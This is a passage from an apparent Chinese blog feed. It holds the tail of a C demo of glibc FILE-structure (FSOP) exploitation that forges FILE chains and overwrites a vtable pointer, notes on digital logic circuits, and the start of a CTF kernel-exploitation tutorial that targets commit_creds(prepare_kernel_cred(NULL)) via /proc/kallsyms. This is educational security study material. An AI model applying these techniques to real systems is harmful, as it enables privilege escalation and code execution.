class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;将第二个假FILE结构体地址填到第一个FILE的_chain字段，使两者链接。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第二个结构体使用另外一个_IO_jumps_t指针。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FILE* fake_FILE_2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    fake_FILE-&gt;_chain = fake_FILE_2;</span><br><span class="line"></span><br><span class="line">    mprotect((<span class="type">void</span>*)(libc_base + <span class="number">0x215000</span>), <span class="number">0x4000</span>, PROT_READ | PROT_WRITE);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序为了方便起见，选择直接修改vtable段为可写，&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;并修改第二个FILE使用的_IO_jumps_t中的overflow指针。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span>* other_IO_jumps = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x215E80</span>);</span><br><span class="line">    other_IO_jumps[<span class="number">3</span>] = (<span class="type">size_t</span>)print_victim;</span><br><span class="line"></span><br><span class="line">    fake_FILE_2-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE_2-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE_2-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE_2)[<span class="number">0xd8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215E80</span>;</span><br><span class="line">    fake_FILE_2-&gt;_flags2 = <span class="number">0x8</span>;</span><br><span class="line">    fake_FILE_2-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) (<span class="type">char</span> *) victim;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑 Chapter 7——中规模通用集成电路及其应用</title>
      <link href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-7%E2%80%94%E2%80%94%E4%B8%AD%E8%A7%84%E6%A8%A1%E9%80%9A%E7%94%A8%E9%9B%86%E6%88%90%E7%94%B5%E8%B7%AF%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/"/>
      <url>/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-7%E2%80%94%E2%80%94%E4%B8%AD%E8%A7%84%E6%A8%A1%E9%80%9A%E7%94%A8%E9%9B%86%E6%88%90%E7%94%B5%E8%B7%AF%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="7-1-常用中规模组合逻辑电路"><a href="#7-1-常用中规模组合逻辑电路" class="headerlink" title="7.1 常用中规模组合逻辑电路"></a>7.1 常用中规模组合逻辑电路</h1><p>包含二进制并行加法器、译码器、编码器、多路选择器和多路分配器等。</p><h2 id="7-1-1-二进制并行加法器"><a href="#7-1-1-二进制并行加法器" class="headerlink" title="7.1.1 二进制并行加法器"></a>7.1.1 二进制并行加法器</h2><p>能够并行产生两个n为二进制数“算数和”的逻辑部件。按照进位方式不同可分为<strong>串行进位二进制并行加法器</strong>和<strong>超前进位二进制并行加法器</strong>两种类型。</p><ol><li>构成思想</li></ol><ul><li>串行二进制并行加法器<br>由全加器级联构成，高位的“和”依赖于来自低位的进位。被加数和加数各位能够并行到达各位输入，各位全加器的进位输入按照从低位到高位逐级串行传递。这里的每一位单独计算，第二位要等到第一位计算完成后才能计算，因此运算速度较慢。</li><li>超前进位二进制并行加法器<br>超前进位二进制并行加法器通过对输入的两个数进行逻辑运算，直接判断哪一位需要进位，无需进行等待。这里对输入两数进行逻辑运算需要进行一些分析。<br>如果两数的某一位都是1，那么这一位必然有进位，因此定义$G_i&#x3D;A_iB_i$为进位产生函数，且此时低位的进位就等于本位的进位。如果两数的某一位只有1个是1，那么此时低位的进位输入能够传送到本位的进位输出，因此定义$P_i&#x3D;A_i\oplus B_i$。由此可得第i位的输出$F_i&#x3D;A_i\oplus B_i\oplus C_{i-1}&#x3D;P_i\oplus C_{i-1}$，第i位的进位$C_i&#x3D;P_iC_{i-1}+G_i$<br>可以根据上面的结论直接写出每一位进位的表达式函数。</li></ul><p><img src="https://img-blog.csdnimg.cn/2f6bdd1f184e4d80afe6a2e78c6f8a2b.png"></p><ol start="2"><li>典型芯片</li></ol><p>二进制并行加法器74283,16引脚，其中$C_0$为来自低位的进位，$FC_4$为输出高位的进位。</p><p><img src="https://img-blog.csdnimg.cn/a3680df8f24c410fa9093041d1a8d277.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>功能：不仅限于加法。</p><blockquote><ol><li>使用加法器进行2进制减法操作<br>如果要使用加法器进行减法操作，需要将减数转换成补码输入。转换成补码需要对每一位取反后再加1，这里的加1可以输入到原低位进位输入端。每一次相减会有4种情况：</li></ol><ul><li>被减数为正数，减数也为正数。此时若结果为正，则原高位进位输出端输出1；若结果为负，则原高位进位输出端输出0。</li><li>被减数为负数，减数也为负数。此时若结果为正，则原高位进位输出端输出1,；若结果为负，则原高位进位输出端输出0。</li><li>被减数为正数，减数为负数。此时原最高位进位输出端必为0，但可能产生正数溢出导致结果为负数。</li><li>被减数为负数，减数为正数。此时原最高位进位输出端必为1，但可能产生负数溢出导致结果为正数。<br>判断溢出的设计思路：首先根据两数最高位判断其为正数还是负数，然后将判断结果与计算结果进行分析。如果两数均为正数但结果为负，或两数均为负数但结果为正，则产生溢出。实际上就是判断两个输入数与输出数的最高位的关系。<br>如果需要对加法器进行级联处理以进行更多位数的减法，那么每一个4位加法器中两数将不再有正负数的概念，均看做无符号正整数。此时仅需考虑第一种情况。<br>对低位借位处理的设计思路：当低位不存在借位时，需要在原低位进位输入端中输入1以构造补码，存在借位时输入0即相当于借位减1。<br>对向高位借位处理的设计思路：当本位需要借位时，原高位进位输出端为0，由于对于高位而言，输入0表示需要借位，因此可<strong>直接将本位原高位进位输出与高位原低位进位输出相连</strong>。</li></ul><ol start="2"><li>使用加法器计算余三码的加法<br>余三码比8421码多3，计算规律：两个1位余三码相加若无进位，则需将结果减3输出，如有进位，则需将结果加3输出。进位时会产生进位信息，<strong>可将低位进位输入与高位进位输出直接相连</strong></li><li>使用加法器计算4位2进制数乘法<br>4位二进制乘法的结果至多8位，可以通过输入列出竖式求出每一位的表达式：<br><img src="https://img-blog.csdnimg.cn/2a562437a51049ad8f3125d6aa615678.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>这里的计算思路是：由于最低位不可能有进位，因此直接将$y_0x_0$输出即可。后面的位可能有进位，这里先取下图红色方框的8位相加，将最低位直接输出，高3位加进位与绿色框的4位相加；将结果最低位直接输出，高3位加进位再与蓝色框的4位相加，最终获得结果。<br><img src="https://img-blog.csdnimg.cn/abdd73877f064336ac35bb4077300609.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></li><li>使用加法器进行4位2421码的加法<br>2421码加法的计算规律：</li></ol><ul><li>如果两位均小于5，计算结果若小于5直接输出，否则加5输出</li><li>如果两位均大于5，产生进位，计算结果若大于4直接输出，否则减5输出</li><li>如果两位中一位大于4，一位小于5，则将结果直接输出，有进位输出进位</li></ul><ol start="5"><li>使用加法器进行4位8421码的加法<br>8421码加法的加法规律：</li></ol><ul><li>如果结果小于10，则直接输出</li><li>如果结果大于10且无进位，则减10输出同时输出进位</li><li>如果结果大于10且有进位，则加6输出同时输出进位</li></ul></blockquote><h2 id="7-2-译码器和解码器"><a href="#7-2-译码器和解码器" class="headerlink" title="7.2 译码器和解码器"></a>7.2 译码器和解码器</h2><h3 id="1-译码器"><a href="#1-译码器" class="headerlink" title="1. 译码器"></a>1. 译码器</h3><p>常见二进制译码器、二-十进制译码器和数字显示译码器</p><ol><li>二进制译码器<br>二进制译码器能将n个输入转换为$2^n$个输出，且输出函数与由输入变量构成最小项具有对应关系的一种多输出组合逻辑电路。其中有一个或多个使能输入端，其为有效电平时译码器才工作，对一组输入代码仅有一个输出为有效电平。<br>常用MSI二进制译码器：2-4线译码器、3-8线译码器（74138）</li></ol><p><img src="https://img-blog.csdnimg.cn/cfea971f89944397a478c401518c285a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/9c5ecc7c1d834431a302b99afb82d7b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>可以看到，使能端$S_1,S_2,S_3$必须都为1才工作。</p><p>功能：不仅限于译码。</p><blockquote><p>(1) 使用译码器实现n个变量的表达式输出<br>这里一般通过将表达式转化为最小项或画出卡诺图加以处理。如要求使用3-8线译码器输出逻辑函数$\sum m(1,4,5,7,8,10,11)$，1个3-8线译码器仅有8个输出，不足以产生16个输出，因此使用两个3-8线译码器。其中随机选取一个输入变量输入到使能端，规定当该变量取值为0时使用哪一个译码器，取值为1时使用另一个译码器。将满足函数条件的最小项全部连入一个与非门，即可在与非门后获得函数的正确输出。电路图如下，输入从低到高为：CBAD<br><img src="https://img-blog.csdnimg.cn/e8f7a99c8f2e466d9bfa1542eb98e3b0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_11,color_FFFFFF,t_70,g_se,x_16"></p></blockquote><ol start="2"><li>二-十进制译码器<br>将4位BCD码的10组代码翻译成10个与十进制数字符号对应的输出信号。7442低电平有效。</li></ol><p><img src="https://img-blog.csdnimg.cn/dd54d7e42156460fbb434bf13ea1abfd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_19,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/9dc139572584409e9b36ef12879ec5df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>当产生非法的BCD码时，7442拒绝译码，避免产生错误信息</p><ol start="3"><li>七段显示译码器<br>用于进行数字显示的译码器，输出接入液晶数码管用于显示。</li></ol><p><img src="https://img-blog.csdnimg.cn/fa83b1f2b2654be88b57ed30fc5d1be5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/0ceebf86565346c99ce711330cd56739.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>$\overline {BI}&#x2F;\overline {BRO}$：熄灭输入端（低电平有效），有时作为输入信号有时输出信号。当作为输入时，其为低电平则所有灯灭；当作为输出时，当$\overline {LT}&#x3D;1,\overline {RBI}&#x3D;0$且输入数码为全0时，$\overline {RBO}&#x3D;0$；否则$\overline {RBO}&#x3D;1$。其主要用于多个数字显示多个译码器的连接。<br>$\overline {LT}$：灯测试端，当$\overline {LT}&#x3D;0,\overline {BI}&#x3D;1$时所有灯全亮。<br>$\overline {RBI}$：灭0输入端，熄灭前置0，即无意义0的显示。$\overline {LT}&#x3D;1,\overline {RBI}&#x3D;0$且输入为全0时，不显示0。</p><h3 id="2-编码器"><a href="#2-编码器" class="headerlink" title="2. 编码器"></a>2. 编码器</h3><p>二-十进制编码器、优先编码器。</p><ol><li>二-十进制编码器<br>将10进制数字0-9分别编成BCD码，输入端10个，输出端4个。</li></ol><p><img src="https://img-blog.csdnimg.cn/b9fbae06362445f9ae7e708c8716e4db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><ol start="2"><li>优先编码器</li></ol><p>上面的二-十进制编码器的输入信号互斥，任何时候只允许一个输入端为有效信号。优先编码器将所有输入确定一个优先级，当多个信号同时输入时，会选择最高优先级的信号输出编码。<br>74148优先编码器输入与输出端均以低电平为有效电平，即若$\overline {I_7}&#x3D;0$，则输出为000。<br>$\overline {I_S}$为选通输入端（允许输入端），当其为0时编码器才工作<br>$O_S$为选通输出端（允许输出端），当$\overline {I_S}&#x3D;0$且无信号输入时$O_S&#x3D;0$<br>$\overline {O_{EX}}$为工作状态标志，当$\overline {I_S}&#x3D;0$且有信号输入时才为0<br>上面两个端口用于扩展编码。如果要对16个输入进行优先编码，则共有4个输出。令一个编码器编码输入0~7，另一个编码8~15，当输入信号为高8位时禁用处理低位的编码器防止两个编码器同时有信号输入而产生错误输出。<br><img src="https://img-blog.csdnimg.cn/5a107eb041cb4f7096999014c526845e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/7060520679ee42d6a4af630f2abb810f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>由上图可知输入下标越大优先级越高。</p><h2 id="7-1-3-多路选择器和多路分配器"><a href="#7-1-3-多路选择器和多路分配器" class="headerlink" title="7.1.3 多路选择器和多路分配器"></a>7.1.3 多路选择器和多路分配器</h2><h3 id="1-多路选择器"><a href="#1-多路选择器" class="headerlink" title="1. 多路选择器"></a>1. 多路选择器</h3><p>具有$2^n$个输入和n个选择控制变量，根据选择控制变量决定输出是输入的哪一个。<br>双4路 MUX 74153、8路 MUX 74152&#x2F;74151和16路 MUX 74150</p><p><img src="https://img-blog.csdnimg.cn/095f9f1b924646d4a6a95f326a93603c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/4026440b87df443ea6541eb0c2449942.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><blockquote><p><strong>应用：</strong></p><ul><li><font color=red>用带有n个选择控制变量的MUX实现含有n个变量的函数的输出</font><br>将函数的真值表依次输入到对应的输入端，通过将变量输入到选择控制变量，就能获得相应的输出。<br>假设输入从0到7分别为0,0,1,1,1,1,0,0，选择控制变量为$A_0,A_1,A_2$。则该选择器的输出相当于求$A_1\oplus A_2$，对应真值表：</li></ul></blockquote><table><thead><tr><th align="center">A2\A1A0</th><th align="center">00</th><th align="center">01</th><th align="center">11</th><th align="center">10</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">0</td><td align="center">0</td></tr></tbody></table><blockquote><p>即$I_i&#x3D;m_i$，$m_i$表示第i个由输入变量组成的最小项。</p><ul><li><font color=red>用带有n个选择控制变量的MUX实现含有n+1个变量的函数的输出</font><br>此时选择控制变量的输入端数量不足，需要随机选择一个控制变量按照某种方式输入到$2^n$个输入中去。<br>假设需要实现如下真值表的功能：</li></ul></blockquote><table><thead><tr><th align="center">A3A2\A1A0</th><th align="center">00</th><th align="center">01</th><th align="center">11</th><th align="center">10</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">0</td><td align="center">1</td><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">01</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">0</td></tr><tr><td align="center">11</td><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">1</td></tr><tr><td align="center">10</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">1</td></tr></tbody></table><blockquote><p>假设控制变量输入选择$A_0,A_1,A_2$，那么其选择的实际上是两个状态，至于这两个状态如何区分需要看$A_3$的值如何。<br><img src="https://img-blog.csdnimg.cn/19ba65f226ee48e99ed5d311de1425a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以将真值表按照$A_0,A_1,A_2$的8种取值分为8块，分别对每一块进行分析，求出每一块中数值与$A_3$的关系。电路图如下所示。<br><img src="https://img-blog.csdnimg.cn/076ddbb4b1e1404788e3fd195876e104.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_19,color_FFFFFF,t_70,g_se,x_16"></p><ul><li><font color=red>用带有n个选择控制变量的MUX实现含有大于n+1个变量的函数的输出</font><br>思想与处理n+1个变量的输出相同。<br>例：用一个2-4线选择器实现上面一个例子的真值表。<br>将$A_1,A_0$作为控制变量输入，可将真值表按照$A_1,A_0$的4种取值划分为4块：<br><img src="https://img-blog.csdnimg.cn/279d6b63f32f4f5389054060673479d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>当$A_0A_1&#x3D;00$时，输出与$A_3,A_2$的关系为：$O&#x3D;\overline {A_3}A_2$<br>当$A_0A_1&#x3D;01$时，输出与$A_3,A_2$的关系为：$O&#x3D;\overline {A_3}$<br>当$A_0A_1&#x3D;11$时，输出与$A_3,A_2$的关系为：$O&#x3D;\overline {A_3A_2}$<br>当$A_0A_1&#x3D;10$时，输出与$A_3,A_2$的关系为：$O&#x3D;\overline {\overline {A_3}A_2}$<br>电路图如下所示：<br><img src="https://img-blog.csdnimg.cn/0a7ffdb108684616802d39fcda008a4a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_18,color_FFFFFF,t_70,g_se,x_16"></li></ul></blockquote><h3 id="2-多路分配器"><a href="#2-多路分配器" class="headerlink" title="2. 多路分配器"></a>2. 多路分配器</h3><p>单输入多输出，从哪一路输出取决于选择控制变量，与选择器相反。</p><blockquote><p><strong>应用：</strong><br>将译码器与选择器结合为比较器：一个数输入到译码器中获得8个输出，将这8个输出接到选择器中，选择器控制变量输入第二个数，如果两数相等，则输出应该为0，否则会输出1。</p></blockquote><h1 id="7-2-常用中规模时序逻辑电路"><a href="#7-2-常用中规模时序逻辑电路" class="headerlink" title="7.2 常用中规模时序逻辑电路"></a>7.2 常用中规模时序逻辑电路</h1><h2 id="7-2-1-集成计数器"><a href="#7-2-1-集成计数器" class="headerlink" title="7.2.1 集成计数器"></a>7.2.1 集成计数器</h2><h3 id="1-集成同步计数器"><a href="#1-集成同步计数器" class="headerlink" title="1. 集成同步计数器"></a>1. 集成同步计数器</h3><p>由4位二进制同步加法计数器74161、单时钟4位二进制同步可逆计数器74191、单时钟十进制可逆计数器74190、双时钟4位二进制同步可逆计数器74193等</p><p><img src="https://img-blog.csdnimg.cn/e3fab0732e4a4a188c69cdab7954ec8e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>输入信号说明：<br>$CLR$：清除端，高电平强制清除<br>$\overline {LD}$：预置控制，高电平时执行自增或自减操作，自增或自减取决于时钟信号<br>$D,C,B,A$：预置初值，前两个信号为低电平时直接为计数器赋值<br>$CP_U\uparrow$：累加计数脉冲<br>$CP_D\uparrow$：累减计数脉冲<br>输出信号：<br>$Q_i$：计数值<br>$\bar Q_{CC}$：进位输出负脉冲<br>$\bar Q_{CB}$：结尾输出负脉冲</p><p><img src="https://img-blog.csdnimg.cn/f096437fde834b5c8f18b2a4dcba37eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><blockquote><p>应用：构成任意模的计数器<br>如果需要构成模小于16的计数器，则只需对输出进行判断，达到某个值后触发电平连接CLR端清零即可。如果模大于16，则需要将多个这样的计数器串联（将进位端与计数脉冲连接），对输出进行统一判断，同样是达到某个值后触发电平连接CLR端清零。</p></blockquote><h3 id="2-集成异步计数器"><a href="#2-集成异步计数器" class="headerlink" title="2. 集成异步计数器"></a>2. 集成异步计数器</h3><p>二—五—十进制加法计数器74290</p><p><img src="https://img-blog.csdnimg.cn/c8c4f6f114ed4281a7af7fad25de459a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/cdbbb4287e0c40d9a13fd2b095e8786a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>功能描述：（注意上图的计数是在<font color=red><strong>下降沿</strong></font>产生的！）</p><ol><li>异步清零：$R_{9A}\cdot R_{9B}&#x3D;0,R_{0A}&#x3D;R_{0B}&#x3D;1$时直接对$Q_A,Q_B,Q_C,Q_D$清零</li><li>异步置9：$R_{9A}&#x3D;R_{9B}&#x3D;1$时直接置9使$Q_DQ_CQ_BQ_A&#x3D;1001$</li><li>计数：$R_{9A}\cdot R_{9B}&#x3D;0,R_{0A}\cdot R_{0B}&#x3D;0$时计数：<br> (1) 模2计数：计数脉冲接到$CP_A$从$Q_A$输出<br> (2) 模5计数：计数脉冲接到$CP_B$从$Q_DQ_CQ_B$输出<br> (3) 模10计数：将模2计数的输出接到模5脉冲输入或将模5计数的输出接到模2脉冲输入（两种计数方式相同计数的输出不同）</li></ol><p><img src="https://img-blog.csdnimg.cn/a22a15abb0f043b590f9beb70b9795bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/c586270b5e8f43d588f529cf911391c6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="7-2-2-集成寄存器"><a href="#7-2-2-集成寄存器" class="headerlink" title="7.2.2 集成寄存器"></a>7.2.2 集成寄存器</h2><p>寄存器：数字系统中用于存放数据或运算结果的一种常用逻辑器件。<br>功能：接收数据、保存数据、传送数据、左右移位、串并输入输出、预置、清零等</p><p>一、典型芯片：74194——4位双向移位寄存器<br><img src="https://img-blog.csdnimg.cn/ed15f318cc3c455b8a2c765bb8df80e2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_19,color_FFFFFF,t_70,g_se,x_16"><br>输入信号说明：<br>$\overline {CLR}$：清零<br>$DCBA$：并行数据输入<br>$D_R$：右移串行数据输入，右移后置于最高位<br>$D_L$：左移串行数据输入，左移后置于最低位<br>$S_1,S_0$：工作方式选择：$S_1S_0&#x3D;00$保持，$&#x3D;01$右移，$&#x3D;10$左移，$&#x3D;11$并行输入<br>$CP$：工作脉冲<br>输出信号说明：<br>$Q_DQ_CQ_BQ_A$：寄存器状态<br><img src="https://img-blog.csdnimg.cn/cc3d6ce4f98144cb8eb891ab35cebd92.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Pwn 入门 (1)</title>
      <link href="/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-1/"/>
      <url>/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-1/</url>
      
        <content type="html"><![CDATA[<p>与用户态程序的pwn不同，Kernel Pwn针对于内核态的漏洞进行，门槛也较用户态pwn更高些。本文分享笔者近来初学Kernel Pwn的经验与教训。</p><p>Kernel pwn的环境搭建与基础知识介绍参考<a href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#Pre-%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96">这里</a>，笔者认为是一个很好的kernel pwn入门教程系列，本文提到的搭建环境、题目分析等都可以找到，本文也主要参考这个系列的文章编写，若阅读本文存在任何疑问请移步上面的链接。</p><p>CTF题目下载地址：<a href="https://github.com/ctf-wiki/ctf-challenges">github</a><br><code>git clone https://github.com/ctf-wiki/ctf-challenges</code>（内含3道kernel pwn入门题）</p><h1 id="搭建环境需要注意的问题"><a href="#搭建环境需要注意的问题" class="headerlink" title="搭建环境需要注意的问题"></a>搭建环境需要注意的问题</h1><ol><li>笔者的kernel pwn环境在ubuntu 20.04上搭建，与参考文档保持一致。之前使用Kali安装，环境没问题，但题目做不了，rootfs.cpio无法解压。无奈只能在ubuntu上重装一次。建议使用ubuntu 20.04搭建此环境，否则可能产生意想不到且在网上都很难找到解决方法的问题。</li><li>运行一个kernel需要打开CPU虚拟化，对于ubuntu 20.04虚拟机，则是打开这两个选项（必须关闭虚拟机才能够勾选）：<br><img src="https://img-blog.csdnimg.cn/3775fa08fc0e4c759b9c4d5f371000d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></li></ol><h1 id="经验与教训"><a href="#经验与教训" class="headerlink" title="经验与教训"></a>经验与教训</h1><p>在一般的pwn中，我们只能跟着题目程序的意思来，各种配各种凑只为执行一次<code>system(&quot;/bin/sh&quot;)</code>；而在Kernel pwn中，我们需要跟着LKM的意思来，在内核中各种配各种凑只为执行一次<code>commit_creds(prepare_kernel_cred(NULL))</code>。从这个角度上看，两种形式的pwn在根本上并没有区别。一般题目中都是在自定义的LKM上下文章，所以我们需要重点关注。</p><p>另外，根据笔者对两个入门kernel pwn题的初步分析，两道题的cpio文件实际上是经过gzip压缩的，在做题时最好首先file一下确认文件类型，<strong>如果不是cpio文件则在本地调试时则应按照原先的打包方式打包回去</strong>，否则可能会出现无法启动等问题。有的题目会给出打包文件系统的shell文件，需要重点关注。<del>（搞了两个小时才知道，我说怎么自己打包的cpio比题目给的大这么多）</del> 如果题目给的内核跑不动，可以尝试将boot.sh中申请的内存改大些（即qemu的-m选项后面，如果64M跑不动就改成128M试试）。</p><p>在入门测试时，经常会遇到内核启动不了，一直在重启的情况，将控制台强行叉掉后再开启可能会显示：<code>qemu-system-x86_64: -s: Failed to find an available port: Address already in use</code>。这是因为强制关闭后，qemu占用的端口还未被清除。解决方法：使用<code>lsof -i tcp:&lt;port&gt;</code>命令查看指定端口的占用情况，在start.sh中看到了qemu后的-s选项说明默认端口为1234。此时即输入<code>lsof -i tcp:1234</code>，找到占用的pid将其kill即可：<code>kill &lt;pid&gt;</code></p><p>明确了我们需要做什么，再去看题目就不会一脸懵了。</p><h1 id="Kernel-pwn首杀——强网杯2018-Core（ROP法）"><a href="#Kernel-pwn首杀——强网杯2018-Core（ROP法）" class="headerlink" title="Kernel pwn首杀——强网杯2018 Core（ROP法）"></a>Kernel pwn首杀——强网杯2018 Core（ROP法）</h1><p>这是一道经典的Kernel pwn入门题。<br><code>etc/init.d/rcS</code>文件或根目录下的<code>init</code>文件是内核刚刚开始运行时就会执行的文件，题目中一般进行初始化内核环境搭建工作，必须仔细阅读。<br>在init文件中，我们发现<code>insmod /core.ko</code>这个语句，加载了一个core.ko，这个就是自定义的LKM。另外，通过<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>可知，我们可以获取到所有内核函数的符号表，这样我们可以轻松地找到commit_cred函数的地址，又由于boot.sh中并未开启内核的KPTI保护，因此虽然开启了KASLR，但这些内核函数我们可以直接访问。</p><p>所以，我们的第一步是遍历<code>/tmp/kallsyms</code>文件找到<code>commit_creds</code>和<code>prepare_kernel_cred</code>两个函数的地址，这一步很简单，会C语言的应该都没有问题。不过为了能够让代码看上去更加简洁，我们使用fscanf函数。该函数从某一个文件标识符中读取字符流并将其转换为我们设定的格式化字符串中的数据。在原理上和scanf函数相似，不过scanf是接受控制台输入的字符。值得注意的是，fscanf函数使用空格分割每一个参数。通过打印<code>/tmp/kallsyms</code>文件我们可以发现，该文件由很多行组成，每一行都有3个值，分别为地址、类型和函数名，中间以空格分开。因此我们可使用<code>fscanf(fd,&quot;%llx%s%s&quot;, ...)</code>来进行逐行读取。同时，充分利用其返回值。fscanf的返回值是成功读取参数的个数，因此当文件读取到末尾时，fscanf由于遇到了EOF，因此返回值为0。我们利用此返回值将fscanf语句写到while循环的条件中，就可以实现文件读取结束后自动退出循环。代码如下（这里的printf打印加入了颜色）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 